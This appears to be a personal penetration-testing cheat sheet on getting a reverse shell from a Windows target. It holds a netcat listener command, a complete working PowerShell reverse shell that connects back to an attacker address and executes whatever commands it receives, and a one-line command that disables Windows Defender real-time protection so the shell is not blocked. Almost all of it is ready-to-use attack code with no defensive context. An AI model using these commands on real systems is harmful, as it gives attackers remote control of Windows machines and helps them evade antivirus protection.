
## Visual
![[Pasted image 20261121011549.png]]

## Reverse Shell to Windows

#### Server on attack box
```bash
sudo nc -lnvp <PORT>
```
- Using port `444` can be a good idea to allow for outbound traffic from target to not get blocked

### Reverse Shell on Client/Target on Powershell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("<IP>",<PORT>)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
  $sendback = (iex $data 2>&1 | Out-String)
  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()
}
$client.Close()

```

### Disabling AV on Powershell so command will execute without blocking
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```


